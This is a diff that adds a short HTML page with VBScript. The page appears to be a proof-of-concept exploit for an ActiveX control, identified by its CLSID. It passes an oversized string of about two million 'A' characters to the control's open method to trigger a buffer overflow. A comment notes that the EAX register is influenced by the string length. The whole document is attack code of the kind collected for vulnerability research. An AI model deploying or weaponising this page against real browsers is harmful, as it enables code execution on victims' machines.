@@ -1,0 +1,9 @@
+<object classid='clsid:5622772D-6C27-11D3-95E5-006008D14F3B' id='test'></object>
+
+<script language='vbscript'>
+
+ buff = String(2097512, "A") '<- EAX changes according to the first parameter of
+                             '   "String" function (Number As Long)
+ test.open buff
+
+</script>
